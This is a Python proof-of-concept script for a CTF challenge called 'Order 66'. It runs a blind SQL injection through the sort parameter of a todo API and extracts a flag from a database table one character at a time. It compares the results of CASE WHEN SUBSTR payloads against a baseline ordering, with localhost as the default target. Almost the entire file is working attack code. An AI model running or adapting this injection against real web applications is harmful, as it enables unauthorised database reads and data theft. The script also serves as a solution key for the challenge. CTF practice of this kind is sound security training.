#!/usr/bin/env python3
"""
Order 66 CTF Challenge - Blind SQL Injection POC
Exploits SQL injection in the sort parameter to extract the flag from the database.
"""

import requests
import string
import time
import warnings

warnings.filterwarnings("ignore")


class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    END = "\033[0m"


def print_status(msg):
    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")


def print_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")


def print_error(msg):
    print(f"{Colors.RED}[-]{Colors.END} {msg}")


def make_request(base_url, payload, verify_ssl):
    """Make request with retry logic"""
    for _ in range(3):
        try:
            r = requests.get(
                f"{base_url}/api/todos?sort={payload}", timeout=30, verify=verify_ssl
            )
            if r.status_code == 200 and "todos" in r.json():
                return r.json()["todos"][0]["text"]
        except:
            time.sleep(2)
    return None


def extract_flag(base_url, flag_length=36, verify_ssl=False):
    """Extract the flag character by character using blind SQL injection"""
    print_status(f"Extracting flag ({flag_length} characters)...")

    # Get baseline
    baseline = make_request(base_url, "created_at", verify_ssl)
    if not baseline:
        print_error("Failed to get baseline")
        return None
    print_status(f"Baseline first todo: {baseline[:30]}...")

    # Character set - put special chars early
    test_chars = list(
        "{}" + string.digits + string.ascii_uppercase + "_-" + string.ascii_lowercase
    )

    flag = ""

    for i in range(1, flag_length + 1):
        time.sleep(1)
        found = False

        for char in test_chars:
            # Escape special chars for URL
            if char == "{":
                char_escaped = "%7B"
            elif char == "}":
                char_escaped = "%7D"
            else:
                char_escaped = char

            test_payload = f"(CASE WHEN (SELECT SUBSTR(flag_value,{i},1) FROM flags LIMIT 1) = BINARY '{char_escaped}' THEN created_at ELSE priority END)"

            result = make_request(base_url, test_payload, verify_ssl)

            if result and result == baseline:
                flag += char
                print_success(f"Position {i}: {char} -> Flag: {flag}")
                found = True
                break

        if not found:
            flag += "?"
            print_error(f"Position {i} not found")

    return flag


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Order 66 CTF - Blind SQL Injection POC"
    )
    parser.add_argument(
        "target",
        nargs="?",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)",
    )
    args = parser.parse_args()

    base_url = args.target.rstrip("/")

    print(
        f"{Colors.YELLOW}Order 66 CTF Challenge - Blind SQL Injection POC{Colors.END}"
    )
    print(f"Target: {base_url}\n")

    # Extract flag
    flag = extract_flag(base_url)

    if flag:
        print_success(f"\nFlag captured: {Colors.GREEN}{flag}{Colors.END}")
    return flag


if __name__ == "__main__":
    main()
